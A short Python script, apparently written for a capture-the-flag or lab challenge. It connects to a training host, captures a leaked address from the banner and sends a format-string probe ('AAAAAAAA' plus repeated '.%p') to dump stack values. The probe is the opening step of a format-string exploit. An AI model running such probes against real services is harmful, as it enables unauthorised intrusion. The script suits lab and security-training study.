import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 23380
s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(5)
time.sleep(0.6)
out = b""
try:
    out = s.recv(8192)
except Exception:
    pass
print("banner:", out.decode("utf-8", "replace")[:300])
m = re.search(rb"0x[0-9a-f]+", out)
print("leak:", m.group(0).decode() if m else None)
s.sendall(b"AAAAAAAA" + b".%p" * 25 + b"\n")
time.sleep(0.8)
out2 = b""
try:
    out2 = s.recv(16384)
except Exception:
    pass
txt = out2.decode("utf-8", "replace")
print("\nreponse:", txt[:900])
s.close()
